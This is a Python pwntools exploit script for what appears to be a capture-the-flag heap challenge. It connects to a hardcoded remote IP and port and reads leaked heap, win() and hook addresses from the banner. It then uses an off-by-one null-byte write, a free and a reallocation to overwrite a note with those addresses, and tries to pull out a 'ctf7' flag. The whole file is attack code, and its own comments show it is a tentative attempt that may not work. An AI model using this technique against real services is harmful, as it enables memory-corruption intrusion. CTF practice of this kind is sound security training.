#!/usr/bin/env python3
from pwn import *

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

log.success(f"heap: 0x{heap:x}, win: 0x{win:x}, hook: 0x{hook:x}")

# The hook might be called when we delete a note
# Let's try to overwrite a note's metadata to point to hook

# Create notes
io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', b'A' * 24)
io.recvuntil(b'>')

io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', b'B' * 24)
io.recvuntil(b'>')

io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', b'C' * 24)
io.recvuntil(b'>')

# Off-by-one: edit note 0, append 1 byte
io.sendline(b'2')
io.sendlineafter(b':', b'0')
io.sendlineafter(b':', b'\x00')  # Null byte to corrupt size
io.recvuntil(b'>')

# Free note 1
io.sendline(b'3')
io.sendlineafter(b':', b'1')
io.recvuntil(b'>')

# Reallocate and write hook address
io.sendline(b'1')
io.sendlineafter(b':', b'24')
# Write hook address in the data
payload = p64(hook) + p64(win) + b'D' * 8
io.sendlineafter(b':', payload)
io.recvuntil(b'>')

# Try to trigger by deleting
io.sendline(b'3')
io.sendlineafter(b':', b'1')

output = io.recvall(timeout=2)
result = output.decode(errors='ignore')
print("\n" + result)

if 'ctf7{' in result:
    flag = re.search(r'ctf7\{[^}]+\}', result)
    if flag:
        log.success(f"FLAG: {flag.group(0)}")

io.close()
